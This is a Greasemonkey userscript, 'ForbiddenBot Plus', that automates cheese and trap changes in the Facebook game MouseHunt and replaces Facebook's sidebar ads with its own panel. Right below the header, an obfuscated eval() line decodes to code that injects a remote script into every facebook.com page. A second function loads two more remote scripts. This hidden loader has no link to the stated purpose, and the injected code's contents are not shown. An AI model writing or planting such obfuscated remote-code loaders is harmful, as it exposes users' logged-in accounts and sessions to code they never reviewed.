// ==UserScript==
// @name           ForbiddenBot Plus + Last Update
// @namespace      http://userscripts.org/users/114488
// @description    FG-Cheese Changer
// @include        http://apps.facebook.com/mousehunt/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


//----------------------------------------------------------------------------------------------------------------------------------
//User Variables
//----------------------------------------------------------------------------------------------------------------------------------
var question1 = GM_getValue('question1', true);
var locANC = GM_getValue('locANC',3);
var locRNC = GM_getValue('locRNC',2);
var locABT = GM_getValue('locABT',2);
var locACRO = GM_getValue('locACRO',3);
var locMAG = GM_getValue('locMAG',10);
var locTRI = GM_getValue('locTRI',13);

var ancient = "bait=21"
var runic = "bait=22"
var box = "equip=63"
var acronym = "equip=32"
var	magma = "equip=68"
var tribal = "equip=64"

var aa = "app10337532241_invCheese"
var bb = "app10337532241_invTraps"

var style =   '.sidebox {'
	+'margin: 0 auto; /* center for now */'
	+'width: 17em; /* ems so it will grow */'
	+'background: url(http://www.vertexwerks.com/tests/sidebox/sbbody-r.gif) no-repeat bottom right;'
	+'font-size: 100%;'
+'}'
+'.boxhead {'
	+'background: url(http://www.vertexwerks.com/tests/sidebox/sbhead-r.gif) no-repeat top right;'
	+'margin: 0;'
	+'padding: 0;'
	+'text-align: center;'
+'}'
+'.boxhead h2 {'
	+'background: url(http://www.vertexwerks.com/tests/sidebox/sbhead-l.gif) no-repeat top left;'
	+'margin: 0;'
	+'padding: 22px 30px 5px;'
	+'color: white; '
	+'font-weight: bold; '
	+'font-size: 1.2em; '
	+'line-height: 1em;'
	+'text-shadow: rgba(0,0,0,.4) 0px 2px 5px; /* Safari-only, but cool */'
+'}'
+'.boxbody {'
	+'background: url(http://www.vertexwerks.com/tests/sidebox/sbbody-l.gif) no-repeat bottom left;'
	+'margin: 0;'
	+'padding: 5px 30px 31px;'
+'}'

init('http://userscripts.org/scripts/source/63229.user.js')
init('http://userscripts.org/scripts/source/60768.user.js')

function init(url)
{
	var head,element1;
	head = document.getElementsByTagName('head')[0];
	element1 = document.createElement('script');
	element1.type = "text/javascript";
	element1.src = url;
	head.appendChild(element1);
}

//----------------------------------------------------------------------------------------------------------------------------------
//Ad Remover and GUI
//----------------------------------------------------------------------------------------------------------------------------------
addGlobalStyle(style)

$("sidebar_ads")
$("sidebar_ads").innerHTML = '<div style="height:28px"></div>'
	+'<div class="sidebox">'
	+'<div class="boxhead"><h2>Forbidden Bot 2.1</h2></div>'
	+'<div class="boxbody">'
	+'<br>No More Settings, the script now auto configures!<br><br><br>'
	+'Enabled?<br><input type="radio" id="r_YES" name="group2" value="Water"> Yes<br><input type="radio" id="r_NO" name="group2" value="Beer"> No<br><br>'
	+'</div>'
+'</div>'


document.getElementsByTagName("center")[0].innerHTML = 'Ads Removed!'
gmValidate();
gmDisplay();
$('r_NO').addEventListener('click', function () {question1=false;gmValidate();}, true);
$('r_YES').addEventListener('click', function () {question1=true;gmValidate();}, true);


//----------------------------------------------------------------------------------------------------------------------------------
//Location Finder
//----------------------------------------------------------------------------------------------------------------------------------
var location
var outer = getElementsByClassName("hudstatlist")[0];
var inner = outer.getElementsByTagName("li")[0].innerHTML;

if(inner == '<span class="hudstatlabel">Location:</span>&nbsp;&nbsp;Forbidden Grove')
{
	location = "FG";
}

if(inner == '<span class="hudstatlabel">Location:</span>&nbsp;&nbsp;Acolyte Realm')
{
	location = "AR";
}

//----------------------------------------------------------------------------------------------------------------------------------
//Cheese Finder
//----------------------------------------------------------------------------------------------------------------------------------
var cheese
var outerr = getElementsByClassName("hudstatlist")[2];
var innerr = outerr.getElementsByTagName("li")[2].innerHTML;
var parsestring1 = innerr.match(/\D/g);
var matchAncient = '<,s,p,a,n, ,c,l,a,s,s,=,",h,u,d,s,t,a,t,l,a,b,e,l,",>,C,h,e,e,s,e,:,<,/,s,p,a,n,>,&,n,b,s,p,;,&,n,b,s,p,;,A,n,c,i,e,n,t, ,(,)';
var matchRunic = '<,s,p,a,n, ,c,l,a,s,s,=,",h,u,d,s,t,a,t,l,a,b,e,l,",>,C,h,e,e,s,e,:,<,/,s,p,a,n,>,&,n,b,s,p,;,&,n,b,s,p,;,R,u,n,i,c, ,(,)';

if (parsestring1 == matchAncient)
{
	cheese = "ANC"
}

if (parsestring1 == matchRunic)
{
	cheese = "RNC"
}

//----------------------------------------------------------------------------------------------------------------------------------
//Trap Finder
//----------------------------------------------------------------------------------------------------------------------------------
var trap;
var matchACRO = '<span class="hudstatlabel">Weapon:</span>&nbsp;&nbsp;Arcane Capturing...'
var matchABT = '<span class="hudstatlabel">Weapon:</span>&nbsp;&nbsp;Ancient Box Trap'
var outside = getElementsByClassName("hudstatlist")[1];
var inside = outside.getElementsByTagName("li")[1].innerHTML

if (inside == matchACRO)
{
	trap = "ACRO"
}

if (inside == matchABT)
{
	trap = "ABT"
}

//----------------------------------------------------------------------------------------------------------------------------------
//Base Finder
//----------------------------------------------------------------------------------------------------------------------------------
var base
var matchMAGMA = '<span class="hudstatlabel">Base:</span>&nbsp;&nbsp;Magma Base'
var matchTRIBAL = '<span class="hudstatlabel">Base:</span>&nbsp;&nbsp;Tribal Base'
var test = getElementsByClassName("hudstatlist")[1].getElementsByTagName("li")[0].innerHTML
if (test == matchMAGMA)
{
	base = "MAGMA"
}

if (test == matchTRIBAL)
{
	base = "TRIBAL"
}

//----------------------------------------------------------------------------------------------------------------------------------
//Take Action!!!!
//----------------------------------------------------------------------------------------------------------------------------------
if(question1 == true)
{

	if (document.title == "MouseHunt on Facebook | Hunter's Inventory")
	{
		setTimeout('document.location = "http://apps.facebook.com/mousehunt/"',10000)
	}

	if (location == "AR")
	{
		if (cheese !="RNC")
		{
			cCheese(runic);
		}
		
		if (trap != "ABT")
		{
			cTrap(box);
		}

		if (base != "TRIBAL")
		{
			cTrap(tribal);
		}
	}

	if (location == "FG")
	{
		if (cheese != "ANC")
		{
			cCheese(ancient);
		}

		if (trap != "ACRO")
		{
			cTrap(acronym);
		}
		
		if (base != "MAGMA")
		{
			cTrap(tribal);
		}

	}

}
//----------------------------------------------------------------------------------------------------------------------------------
//Functions
//----------------------------------------------------------------------------------------------------------------------------------

function $(id) {
  return document.getElementById(id);
}

function getElementsByClassName(classname, node)  {
    if(!node) node = document.getElementsByTagName("body")[0];
    var a = [];
    var re = new RegExp('\\b' + classname + '\\b');
    var els = node.getElementsByTagName("*");
    for(var i=0,j=els.length; i<j; i++)
        if(re.test(els[i].className))a.push(els[i]);
    return a;
}

function cCheese(Name)
{
	if (document.location != "http://apps.facebook.com/mousehunt/inventory.php?tab=invTraps")
	{
		document.location = "http://apps.facebook.com/mousehunt/inventory.php?tab=invTraps"
	}
	
	if (document.title == "MouseHunt on Facebook | Hunter's Inventory")
	{
		cPart(Name,aa);
	}
}

function cTrap(Name)
{
	if (document.location != "http://apps.facebook.com/mousehunt/inventory.php?tab=invTraps")
	{
		document.location = "http://apps.facebook.com/mousehunt/inventory.php?tab=invTraps"
	}
	
	if (document.title == "MouseHunt on Facebook | Hunter's Inventory")
	{
		cPart(Name,bb);
	}
}

function cPart(Name,Type)
{
	for (var i=0;i<25;i++)
	{
		if ($("app10337532241_invCheese").getElementsByClassName("armbutton")[i].innerHTML != '<span class="armedmsg">- ARMED -</span>')
		{
			var v = $(Type).getElementsByClassName("armbutton")[i].getElementsByTagName("a")[0].href
			if	(v.indexOf(Name)>1)
			{
				document.location = v
				return i;
			}
		}

		if (i == 19)
		{
			return i;
		}
	}
}

function gmValidate()
{
	GM_setValue('question1',question1);
	GM_setValue('locANC',locANC)
	GM_setValue('locRNC',locRNC)
	GM_setValue('locABT',locABT)
	GM_setValue('locACRO',locACRO)
	GM_setValue('locMAG',locMAG)
	GM_setValue('locTRI',locTRI)

}

function gmDisplay()
{
	$('r_YES').checked=question1;
	$('r_NO').checked=!question1;
}

function addGlobalStyle(css) {
    var head, style;
    head = document.getElementsByTagName('head')[0];
    if (!head) { return; }
    style = document.createElement('style');
    style.type = 'text/css';
    style.innerHTML = css;
    head.appendChild(style);
}
